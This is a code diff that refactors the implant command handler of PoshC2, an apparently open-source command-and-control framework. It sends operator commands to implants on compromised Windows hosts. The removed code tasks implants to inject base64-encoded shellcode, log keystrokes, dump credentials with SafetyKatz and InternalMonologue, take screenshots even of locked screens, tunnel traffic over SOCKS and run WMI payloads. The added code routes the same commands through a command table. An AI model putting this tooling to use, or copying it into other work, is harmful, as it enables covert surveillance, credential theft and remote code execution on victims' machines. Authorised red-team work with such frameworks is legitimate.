@@ -1,270 +1,107 @@
-import base64, re, traceback, os, string, sys
 from prompt_toolkit import PromptSession
-from prompt_toolkit.history import FileHistory
 from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
+from prompt_toolkit.history import FileHistory
 from prompt_toolkit.styles import Style
 
+from poshc2.Utils import get_command_word
 from poshc2.client.Alias import cs_alias, cs_replace
-from poshc2.Colours import Colours
-from poshc2.Utils import validate_sleep_time, argp, load_file, gen_key
-from poshc2.server.AutoLoads import check_module_loaded, run_autoloads_sharp
-from poshc2.client.Help import sharp_help, allhelp
-from poshc2.server.Config import PoshInstallDirectory, PoshProjectDirectory, SocksHost, PayloadsDirectory
-from poshc2.server.Core import print_bad
-from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter
-from poshc2.server.PowerStatus import getpowerstatus
-from poshc2.server.database.DB import hide_implant, new_task, unhide_implant, kill_implant, get_implantdetails, get_sharpurls
-from poshc2.server.database.DB import select_item, new_c2_message, get_powerstatusbyrandomuri, update_label, get_randomuri
+from poshc2.client.cli.AutosuggestionAggregator import AutosuggestionAggregator
+from poshc2.client.cli.CommandPromptCompleter import FirstWordCompleter
+from poshc2.client.cli.PoshExamplesAutosuggestions import AutoSuggestFromPoshExamples
+from poshc2.client.command_handlers.CommonCommands import common_implant_commands, common_implant_commands_help, common_implant_examples, common_block_help
+from poshc2.client.command_handlers.SharpHandler import commands as sharp_commands, examples as sharp_examples
+from poshc2.server.AutoLoads import run_sharp_autoloads
+from poshc2.server.Config import PoshProjectDirectory
+from poshc2.server.Core import get_parent_implant
+from poshc2.server.ImplantType import ImplantType
+from poshc2.server.database.Helpers import insert_object, get_implant_by_numeric_id
+from poshc2.server.database.Model import NewTask
+
+commands = {}
+commands.update(common_implant_commands)
+commands.update(sharp_commands)
+commands_help = {}
+commands_help.update(common_implant_commands_help)
+examples = []
+examples.extend(sharp_examples)
+examples.extend(common_implant_examples)
+block_help = {}
+block_help.update(common_block_help)
+
+style = Style.from_dict({
+    '': '#772953',
+})
+
+autosuggester = AutoSuggestFromPoshExamples(examples)
 
 
-def handle_fcomm_command(command, user, randomuri, implant_id):
+def fc_prompt(prefix):
+    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/{ImplantType.SharpFComm.get_history_file()}'),
+                            auto_suggest=AutosuggestionAggregator([AutoSuggestFromHistory(), autosuggester]), style=style)
+    completions = list(commands.keys())
+    completions.extend(examples)
+    return session.prompt(f'{prefix}> ', completer=FirstWordCompleter(completions, WORD=True))
 
-    # convert randomuri to parent randomuri
-    oldrandomuri = randomuri
-    p = get_implantdetails(randomuri)
-    newimplant_id = re.search(r'(?<=\s)\S*', p.Label).group()
-    if newimplant_id is not None:
-        randomuri = get_randomuri(newimplant_id)
 
-    # alias mapping
+def handle_fcomm_command(command, user, parent_implant_id, handler_numeric_id):
+    parent_implant = get_parent_implant(parent_implant_id)
+    implant = get_implant_by_numeric_id(handler_numeric_id)
+    command = command.strip()
+
+    command_word = get_command_word(command)
+
+    if command_word == "hide-implant" or command_word == "unhide-implant":
+        commands[command_word](user, command, implant.id, None)
+        return
+
+    if not parent_implant:
+        print("Could not find parent implant for this pbind implant - does it need linking to?")
+        return
+
     for alias in cs_alias:
         if alias[0] == command[:len(command.rstrip())]:
             command = alias[1]
 
-    # alias replace
     for alias in cs_replace:
         if command.startswith(alias[0]):
             command = command.replace(alias[0], alias[1])
 
-    original_command = command
-    command = command.strip()
+    run_sharp_autoloads(command, parent_implant.id, user, load_module_command=f"fcomm-load-module {handler_numeric_id}")
+    command_word = get_command_word(command)
 
-    run_autoloads_sharp(command, randomuri, user, loadmodule_command="fcomm-loadmodule")
+    if command_word.startswith("load-module"):
+        if " " in command:
+            module_name = command.split()[1]
+            new_task = NewTask(
+                implant_id=parent_implant.id,
+                command=f"fcomm-load-module {handler_numeric_id} {module_name}",
+                user=user,
+                child_implant_id=None
+            )
 
-    if command.startswith("searchhistory"):
-        searchterm = (command).replace("searchhistory ", "")
-        with open('%s/.implant-history' % PoshProjectDirectory) as hisfile:
-            for line in hisfile:
-                if searchterm in line.lower():
-                    print(Colours.PURPLE + line.replace("+", ""))
-
-    elif command.startswith("searchhelp"):
-        searchterm = (command).replace("searchhelp ", "")
-        helpful = sharp_help.split('\n')
-        for line in helpful:
-            if searchterm in line.lower():
-                print(Colours.PURPLE + line)
-
-    elif command.startswith("searchallhelp"):
-        searchterm = (command).replace("searchallhelp ", "")
-        for line in allhelp:
-            if searchterm in line.lower():
-                print(Colours.GREEN + line)
-
-    elif command.startswith("upload-file"):
-        source = ""
-        destination = ""
-        if command == "upload-file":
-            style = Style.from_dict({
-                '': '#772953',
-            })
-            session = PromptSession(history=FileHistory('%s/.upload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
-            try:
-                source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
-                source = PayloadsDirectory + source
-            except KeyboardInterrupt:
-                return
-            while not os.path.isfile(source):
-                print("File does not exist: %s" % source)
-                source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
-                source = PayloadsDirectory + source
-            destination = session.prompt("Location to upload to: ")
+            insert_object(new_task)
         else:
-            args = argp(command)
-            source = args.source
-            destination = args.destination
-        try:
-            destination = destination.replace("\\", "\\\\")
-            print("")
-            print("Uploading %s to %s" % (source, destination))
-            uploadcommand = f"upload-file {source} {destination}"
-            new_task(f"fcomm-command {uploadcommand}", user, randomuri)
-        except Exception as e:
-            print_bad("Error with source file: %s" % e)
-            traceback.print_exc()
-
-    elif command.startswith("unhide-implant"):
-        unhide_implant(oldrandomuri)
-
-    elif command.startswith("hide-implant"):
-        hide_implant(oldrandomuri)
-
-    elif command.startswith("inject-shellcode"):
-        params = re.compile("inject-shellcode", re.IGNORECASE)
-        params = params.sub("", command)
-        style = Style.from_dict({
-            '': '#772953',
-        })
-        session = PromptSession(history=FileHistory('%s/.shellcode-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
-        try:
-            path = session.prompt("Location of shellcode file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
-            path = PayloadsDirectory + path
-        except KeyboardInterrupt:
-            return
-        try:
-            shellcodefile = load_file(path)
-            if shellcodefile is not None:
-                new_task("fcomm-command run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile).decode("utf-8"), params, os.path.basename(path)), user, randomuri)
-        except Exception as e:
-            print("Error loading file: %s" % e)
-
-    elif command.startswith("migrate"):
-        params = re.compile("migrate", re.IGNORECASE)
-        params = params.sub("", command)
-        migrate(randomuri, user, params)
-
-    elif command == "kill-implant" or command == "exit":
-        impid = get_implantdetails(randomuri)
-        ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid.ImplantID)
-        if ri.lower() == "n":
-            print("Implant not terminated")
-        if ri == "" or ri.lower() == "y":
-            pid = impid.PID
-            new_task("fcomm-kill", user, randomuri)
-            new_task("kill-process %s" % (pid), user, randomuri)
-            kill_implant(oldrandomuri)
-
-    elif command == "sharpsocks":
-        from random import choice
-        allchar = string.ascii_letters
-        channel = "".join(choice(allchar) for x in range(25))
-        sharpkey = gen_key().decode("utf-8")
-        sharpurls = get_sharpurls()
-        sharpurls = sharpurls.split(",")
-        sharpurl = select_item("HostnameIP", "C2Server")
-        print(PoshInstallDirectory + "SharpSocks/SharpSocksServerCore -c=%s -k=%s --verbose -l=%s\r\n" % (channel, sharpkey, SocksHost) + Colours.PURPLE)
-        ri = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
-        if ri.lower() == "n":
-            print("")
-        if ri == "":
-            new_task("fcomm-command run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", "")), user, randomuri)
-        if ri.lower() == "y":
-            new_task("fcomm-command run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", "")), user, randomuri)
-
-    elif (command.startswith("stop-keystrokes")):
-        new_task("fcomm-command run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
-        update_label("", randomuri)
-
-    elif (command.startswith("start-keystrokes")):
-        check_module_loaded("Logger.exe", randomuri, user)
-        new_task("fcomm-command run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
-        update_label("KEYLOG", randomuri)
-
-    elif (command.startswith("get-keystrokes")):
-        new_task("fcomm-command run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
-
-    elif (command.startswith("get-screenshotmulti")):
-        pwrStatus = get_powerstatusbyrandomuri(randomuri)
-        if (pwrStatus is not None and pwrStatus[7]):
-            ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
-            if ri.lower() == "n" or ri.lower() == "":
-                return
-        new_task(f"fcomm-command {command}", user, randomuri)
-        update_label("SCREENSHOT", randomuri)
-
-    elif (command.startswith("get-screenshot")):
-        pwrStatus = get_powerstatusbyrandomuri(randomuri)
-        if (pwrStatus is not None and pwrStatus[7]):
-            ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
-            if ri.lower() == "n" or ri.lower() == "":
-                return
-        new_task(f"fcomm-command {command}", user, randomuri)
-
-    elif (command == "get-powerstatus"):
-        getpowerstatus(randomuri)
-        new_task("fcomm-command run-dll PwrStatusTracker.PwrFrm PwrStatusTracker GetPowerStatusResult ", user, randomuri)
-
-    elif (command == "getpowerstatus"):
-        getpowerstatus(randomuri)
-        new_task("fcomm-command run-dll PwrStatusTracker.PwrFrm PwrStatusTracker GetPowerStatusResult ", user, randomuri)
-
-    elif (command.startswith("stop-powerstatus")):
-        new_task(f"fcomm-command {command}", user, randomuri)
-        update_label("", randomuri)
-
-    elif (command.startswith("stoppowerstatus")):
-        new_task(f"fcomm-command {command}", user, randomuri)
-        update_label("", randomuri)
-
-    elif (command.startswith("pslo")):
-        new_task(f"fcomm-{command}", user, randomuri)
-
-    elif (command.startswith("run-exe SharpWMI.Program")) and "execute" in command and "payload" not in command:
-        style = Style.from_dict({'': '#772953'})
-        session = PromptSession(history=FileHistory('%s/.shellcode-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
-        try:
-            path = session.prompt("Location of base64 vbs/js file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.b64"))
-            path = PayloadsDirectory + path
-        except KeyboardInterrupt:
-            return
-        if os.path.isfile(path):
-            with open(path, "r") as p:
-                payload = p.read()
-            new_task("fcomm-command %s payload=%s" % (command, payload), user, randomuri)
-        else:
-            print_bad("Could not find file")
-
-    elif (command.startswith("get-hash")):
-        check_module_loaded("InternalMonologue.exe", randomuri, user)
-        new_task("fcomm-command run-exe InternalMonologue.Program InternalMonologue", user, randomuri)
-
-    elif (command.startswith("safetykatz")):
-        new_task("fcomm-command run-exe SafetyKatz.Program %s" % command, user, randomuri)
-
-    elif command.startswith("loadmoduleforce"):
-        params = re.compile("loadmoduleforce ", re.IGNORECASE)
-        params = params.sub("", command)
-        new_task("fcomm-loadmodule %s" % params, user, randomuri)
-
-    elif command.startswith("loadmodule"):
-        params = re.compile("loadmodule ", re.IGNORECASE)
-        params = params.sub("", command)
-        new_task("fcomm-loadmodule %s" % params, user, randomuri)
-
-    elif command.startswith("listmodules"):
-        modules = os.listdir("%s/Modules/" % PoshInstallDirectory)
-        modules = sorted(modules, key=lambda s: s.lower())
-        print("")
-        print("[+] Available modules:")
-        print("")
-        for mod in modules:
-            if (".exe" in mod) or (".dll" in mod):
-                print(mod)
-
-    elif command.startswith("modulesloaded"):
-        ml = get_implantdetails(randomuri)
-        print(ml.ModsLoaded)
-        new_task("fcomm-command listmodules", user, randomuri)
-
-    elif command == "help" or command == "?":
-        print(sharp_help)
-
-    elif command.startswith("beacon") or command.startswith("set-beacon") or command.startswith("setbeacon"):
-        new_sleep = command.replace('set-beacon ', '')
-        new_sleep = new_sleep.replace('setbeacon ', '')
-        new_sleep = new_sleep.replace('beacon ', '').strip()
-        if not validate_sleep_time(new_sleep):
-            print(Colours.RED)
-            print("Invalid sleep command, please specify a time such as 50s, 10m or 1h")
-            print(Colours.PURPLE)
-        else:
-            new_task(f"fcomm-command {command}", user, randomuri)
-
-    else:
-        if command:
-            new_task(f"fcomm-command {original_command}", user, randomuri)
+            print_bad("Please provide a module to load")
         return
 
+    if command_word in commands:
+        if command_word in common_implant_commands:
+            implant = get_implant_by_numeric_id(handler_numeric_id)
+            commands[command_word](user, command, implant.id, f"fcomm-command {handler_numeric_id}")
+        else:
+            commands[command_word](user, command, parent_implant.id, f"fcomm-command {handler_numeric_id}")
+        return
 
-def migrate(randomuri, user, params=""):
-    print("Do not use migrate when in a fcomm implant - use Inject-Shellcode")
+    if command:
+        new_task = NewTask(
+            implant_id=parent_implant.id,
+            command=f"fcomm-command {handler_numeric_id} {command}",
+            user=user,
+            child_implant_id=None
+        )
+
+        insert_object(new_task)
+
+
+def get_commands():
+    return commands.keys()
